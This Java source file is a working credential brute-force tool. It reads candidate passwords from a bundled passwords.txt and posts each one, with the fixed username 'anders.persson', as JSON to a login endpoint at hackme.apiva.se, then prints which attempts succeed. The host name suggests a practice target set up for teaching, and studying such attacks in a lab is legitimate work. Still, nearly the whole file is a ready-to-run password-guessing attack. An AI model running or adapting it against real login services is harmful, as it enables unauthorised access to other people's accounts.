package se.apiva;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

/**
 * Hello world!
 *
 */
public class App 
{
    private static final String TARGET_URL = "https://hackme.apiva.se/login";
    private static final String USERNAME = "anders.persson";
    private static final int DELAY_MS = 100;

    public static void main( String[] args )
    {
        // Read passwords (line by line) from an external file
        String passwordFile = "passwords.txt";
        InputStream inputStream = App.class
                .getClassLoader()
                .getResourceAsStream(passwordFile);

        try (BufferedReader br = new BufferedReader(new InputStreamReader(inputStream))) {
            String password;
            while ((password = br.readLine()) != null) {
                sendLoginRequest(USERNAME, password.trim()); // Send a login request
                Thread.sleep(DELAY_MS); // Wait a short while before next try - do not remove!
            }
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
    }

    /**
     * Sends a login request
     * @param username The username to log in with
     * @param password The password to try
     */
    private static void sendLoginRequest(String username, String password) {
        try {
            // Create a connection for the target service
            URL url = new URL(TARGET_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);

            // Create the POST data
            String postData = """
                    {
                        "username": "USERNAME",
                        "password": "PASSWORD"
                     }
                    """;
            postData = postData.replace("USERNAME", username);
            postData = postData.replace("PASSWORD", password);

            // Send the request
            try (OutputStream os = connection.getOutputStream()) {
                os.write(postData.getBytes(StandardCharsets.UTF_8));
            }

            // Read the response
            int responseCode = connection.getResponseCode();
            String responseMessage = "FAILURE";
            if (responseCode == HttpURLConnection.HTTP_OK) {
                responseMessage = readResponse(connection);
            }

            // Show the result
            System.out.println("[" + responseCode + "] Password: " + password + " -> " + responseMessage);

            connection.disconnect();
        } catch (IOException e) {
            System.err.println("Not so good: " + e.getMessage());
        }
    }

    /**
     * Reads the response from the server from a HttpURLConnection instance.
     * @param connection The connection instance
     * @return A string with the received response
     * @throws IOException if the response could not be read
     */
    private static String readResponse(HttpURLConnection connection) throws IOException {
        try (BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream(), StandardCharsets.UTF_8))) {
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                response.append(line);
            }
            return response.toString();
        }
    }
}
